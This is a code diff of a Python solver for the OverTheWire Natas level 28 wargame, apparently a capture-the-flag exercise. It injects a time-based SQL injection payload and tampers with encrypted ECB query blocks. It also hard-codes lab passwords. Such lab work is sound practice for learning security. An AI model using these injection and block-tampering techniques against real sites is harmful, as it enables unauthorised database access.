@@ -14,27 +14,37 @@ def writeResponse(response, enumerate = ''):
         browserFile.write(BeautifulSoup(response.text, 'html.parser').prettify())
 
 def decipher(encStr):
-    return base64.b64decode(urllib.parse.unquote(encStr)).hex()
+    return urllib.parse.unquote(encStr)
 
 def recipher(decStr):
-    return urllib.parse.quote(base64.b64encode(bytes.fromhex(decStr)))
+    return urllib.parse.quote(decStr)
 
 
 def urlQuery(url, auth, my_params):
     return decipher(make(url,auth,my_params).url[60:])
 
 def numToCode(x):
-    return [x,urlQuery(url, lvl_pass, {'query':'%'*x})]
+    return [x,urlQuery(url, lvl_pass, {'query':'         ' + "' AND SLEEP(10) -- " + ' '*x})]
 
 lvl_name = 'natas28'
 lvl_pass = requests.auth.HTTPBasicAuth(f'{lvl_name}','skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4')
 url = f'http://{lvl_name}.natas.labs.overthewire.org'
-NUM_CODES=50
+NUM_CODES=20
 BLOCK_SIZE=16
+def main():
+    with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_CODES) as executor:
+        codes = [x for x in executor.map(numToCode, list(range(NUM_CODES+1)))]
 
-with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_CODES) as executor:
-    codes = [x for x in executor.map(numToCode, list(range(NUM_CODES+1)))]
+    for x in codes:
+        space_x = x[1][:12] + ' ' + ' '.join([x[1][i:i+(BLOCK_SIZE)] for i in range(12, len(x[1]), BLOCK_SIZE)])
+        print(f'{x[0]:2}  -->    {len(x[1]):5}: {space_x}')
 
-for x in codes:
-    space_x = ' '.join([x[1][i:i+(BLOCK_SIZE*2)] for i in range(0, len(x[1]), BLOCK_SIZE*2)])
-    print(f'{x[0]:2}  -->    {len(x[1]):5}: {space_x}')
+def solve(newstr):
+    x = urlQuery(url, lvl_pass, {'query': (' ' * 9) + newstr})
+    code = [x[1][:12]] + [x[i:i+(BLOCK_SIZE)] for i in range(12, len(x), BLOCK_SIZE)]
+    print(' '.join(code))
+    code.pop(2)
+    print(' '.join(code))
+    print(recipher(''.join(code)))
+    
+    #PW= pc0w0Vo0KpTHcEsgMhXu2EwUzyYemPno
